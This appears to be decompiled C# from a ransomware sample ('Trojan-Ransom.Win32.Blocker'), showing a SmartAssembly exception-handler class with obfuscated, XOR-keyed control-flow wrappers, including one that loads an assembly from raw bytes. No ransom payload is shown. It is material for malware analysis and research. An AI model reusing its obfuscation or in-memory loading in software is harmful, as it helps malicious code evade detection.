// Decompiled with JetBrains decompiler
// Type: SmartAssembly.SmartExceptionsWithUI.UnhandledExceptionHandlerWithUI
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;
using Ⴈ;

namespace SmartAssembly.SmartExceptionsWithUI
{
  public class UnhandledExceptionHandlerWithUI : UnhandledExceptionHandler
  {
    protected override void OnSecurityException(SecurityExceptionEventArgs e)
    {
      ႷႤ ⴗⴄ;
      int num1;
      try
      {
        ⴗⴄ = new ႷႤ(e);
        try
        {
          int num2 = (int) SmartAssembly.License.License.Ⴓ((Form) ⴗⴄ, 146, 233);
        }
        finally
        {
          num1 = 0;
          while (true)
          {
            switch (num1)
            {
              case 1:
              case 2:
              case 4:
                goto label_6;
              case 3:
                goto label_5;
              default:
                num1 = ⴗⴄ == null ? 4 : 3;
                continue;
            }
          }
label_5:
          ⴗⴄ.Dispose();
label_6:;
        }
      }
      catch (Exception ex)
      {
        ႷႤ o1 = ⴗⴄ;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num1;
        SecurityExceptionEventArgs o4 = e;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) this, (object) o4);
        throw;
      }
    }

    protected override void OnReportException(ReportExceptionEventArgs e)
    {
      ႷႭ ⴗⴍ;
      int num1;
      try
      {
        ⴗⴍ = new ႷႭ((UnhandledExceptionHandler) this, e);
        try
        {
          int num2 = (int) SmartAssembly.License.License.Ⴓ((Form) ⴗⴍ, 834, 825);
        }
        finally
        {
          num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 5:
                goto label_5;
              case 2:
              case 3:
              case 4:
                goto label_6;
              default:
                num1 = ⴗⴍ == null ? 2 : 0;
                continue;
            }
          }
label_5:
          ⴗⴍ.Dispose();
label_6:;
        }
      }
      catch (Exception ex)
      {
        ႷႭ o1 = ⴗⴍ;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num1;
        ReportExceptionEventArgs o4 = e;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) this, (object) o4);
        throw;
      }
    }

    protected override void OnFatalException(FatalExceptionEventArgs e)
    {
      try
      {
        int num = (int) MessageBox.Show(SmartAssembly.SmartUsageCore.ReportUsageAttribute.Ⴐ(e.FatalException, 936, 987), SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴃ(ႷႭ.ႥႳ(1491050052, 4), (object) Ⴈ.ႳႷ.Ⴗ(2059790408, 8), 286, 332), MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      catch (Exception ex)
      {
        FatalExceptionEventArgs o2 = e;
        StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
        throw;
      }
    }

    public static bool AttachApp()
    {
      int num1;
      bool flag;
      int num2;
      int num3;
      string securityMessage;
      ႷႤ ⴗⴄ;
      int num4;
      try
      {
        try
        {
          num1 = 0;
          switch (num1)
          {
            case 1:
            case 4:
              break;
            default:
              UnhandledExceptionHandler.AttachExceptionHandler((UnhandledExceptionHandler) new UnhandledExceptionHandlerWithUI());
              flag = true;
              break;
          }
        }
        catch (SecurityException ex1)
        {
          try
          {
            try
            {
              num2 = 0;
              switch (num2)
              {
                case 1:
                case 2:
                  break;
                default:
                  // ISSUE: type reference
                  // ISSUE: explicit non-virtual call
                  __nonvirtual (SendingReportFeedbackEventArgs1.Ⴍ(__typeref (Application), 38, 93).InvokeMember(ႷႭ.ႥႭ(490612887, 5), BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null));
                  break;
              }
            }
            catch (MissingMethodException ex2)
            {
            }
            num3 = 6;
            while (true)
            {
              switch (num3)
              {
                case 0:
                  ⴗⴄ = new ႷႤ(new SecurityExceptionEventArgs(securityMessage, false));
                  Ⴈ.Ⴈ.Ⴃ((Form) ⴗⴄ, true, 62, 67);
                  goto case 5;
                case 2:
                case 3:
                  goto label_11;
                case 5:
                  num3 = 3;
                  continue;
                default:
                  securityMessage = SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴃ(ႷႭ.ႥႭ(490614625, 8), (object) Ⴈ.ႳႷ.Ⴗ(2059790403, 3), 553, 635);
                  num3 = 0;
                  continue;
              }
            }
label_11:
            int num5 = (int) SmartAssembly.License.License.Ⴓ((Form) ⴗⴄ, 43, 80);
          }
          catch (Exception ex3)
          {
            int num6 = (int) MessageBox.Show(SmartAssembly.SmartUsageCore.ReportUsageAttribute.Ⴐ(ex3, 788, 871), string.Format(ႷႭ.ႥႳ(1491050053, 5), (object) Ⴈ.ႳႷ.Ⴗ(2059790405, 5)), MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
          num4 = 0;
          switch (num4)
          {
            case 3:
              break;
            default:
              flag = false;
              break;
          }
        }
        switch (3)
        {
          default:
            return flag;
        }
      }
      catch (Exception ex)
      {
        string o1 = securityMessage;
        ႷႤ o2 = ⴗⴄ;
        Exception o3 = ex3;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o4 = (ValueType) flag;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o8 = (ValueType) num4;
        int num7;
        // ISSUE: variable of a boxed type
        __Boxed<int> o9 = (ValueType) num7;
        StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9);
        throw;
      }
    }

    public UnhandledExceptionHandlerWithUI()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static UnhandledExceptionHandlerWithUI()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static char Ⴓ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 23:
            num2 = 6;
            break;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
              goto label_3;
            case 2:
            case 3:
            case 6:
              goto label_8;
            case 4:
            case 7:
              num1 = 1;
              continue;
            case 5:
              num1 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (UnhandledExceptionHandlerWithUI.Ⴓ);
              num1 = 1;
              continue;
          }
        }
label_8:
        return Conversions.ToChar(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴗ([In] Control obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              num1 = 4;
              continue;
            case 1:
              goto label_10;
            case 2:
            case 5:
              goto label_7;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 19:
                  num2 = 5;
                  break;
                case 20:
                  goto label_8;
                default:
                  num2 = 3;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_10:
        return;
label_7:
        obj0.SuspendLayout();
        return;
label_8:
        obj0.SuspendLayout();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Control o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static Assembly Ⴅ([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 112:
            num2 = 5;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 4;
              continue;
            case 1:
            case 2:
            case 5:
            case 6:
              goto label_8;
            case 3:
              num1 = 4;
              continue;
            case 4:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (UnhandledExceptionHandlerWithUI.Ⴅ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return Assembly.Load(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        byte[] o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static FileStream Ⴃ(
      [In] string obj0,
      [In] FileMode obj1,
      [In] FileAccess obj2,
      [In] FileShare obj3,
      [In] int obj4,
      [In] int obj5)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj5 ^ obj4)
        {
          case 92:
            num2 = 0;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 6:
              goto label_8;
            case 2:
            case 3:
              num1 = 5;
              continue;
            case 4:
              num1 = 5;
              continue;
            case 5:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (UnhandledExceptionHandlerWithUI.Ⴃ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return File.Open(obj0, obj1, obj2, obj3);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<FileMode> o3 = (Enum) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<FileAccess> o4 = (Enum) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<FileShare> o5 = (Enum) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) obj5;
        StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
        throw;
      }
    }

    internal static Font Ⴄ([In] Control obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 110:
            num2 = 3;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_3;
            case 1:
            case 4:
              num1 = 0;
              continue;
            case 3:
              goto label_8;
            case 5:
            case 7:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (UnhandledExceptionHandlerWithUI.Ⴄ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.Font;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Control o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴐ(
      [In] AppDomain obj0,
      [In] UnhandledExceptionEventHandler obj1,
      [In] int obj2,
      [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_7;
            case 3:
            case 4:
              num1 = 2;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 54:
                  num2 = 0;
                  break;
                default:
                  num2 = 3;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.UnhandledException += obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        AppDomain o3 = obj0;
        UnhandledExceptionEventHandler o4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static CultureInfo Ⴍ([In] int obj0, [In] int obj1)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj1 ^ obj0)
        {
          case 69:
            num2 = 7;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 5;
              continue;
            case 2:
            case 3:
            case 4:
              num1 = 5;
              continue;
            case 5:
              goto label_3;
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (UnhandledExceptionHandlerWithUI.Ⴍ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return CultureInfo.CurrentCulture;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    internal static string Ⴀ([In] AssemblyName obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 44:
            num2 = 5;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              goto label_8;
            case 1:
              num1 = 6;
              continue;
            case 2:
              num1 = 6;
              continue;
            case 6:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (UnhandledExceptionHandlerWithUI.Ⴀ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return obj0.Name;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        AssemblyName o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static int Ⴜ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 28:
            num2 = 1;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 3:
            case 7:
              goto label_8;
            case 2:
              num1 = 5;
              continue;
            case 5:
              goto label_3;
            case 6:
              num1 = 5;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (UnhandledExceptionHandlerWithUI.Ⴜ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return obj0.IndexOf(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static int ႷႳ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      try
      {
        switch ((obj5 ^ obj4) - 51)
        {
          case 0:
            return obj0.Read(obj1, obj2, obj3);
          default:
            goto label_0;
        }
      }
      catch (Exception ex)
      {
        Stream o1 = obj0;
        byte[] o2 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj4;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj5;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴈ
    {
      internal SendingReportStep1 Ⴃ;
      internal bool Ⴐ;
      internal string Ⴈ;
      internal string Ⴄ;
    }
  }
}
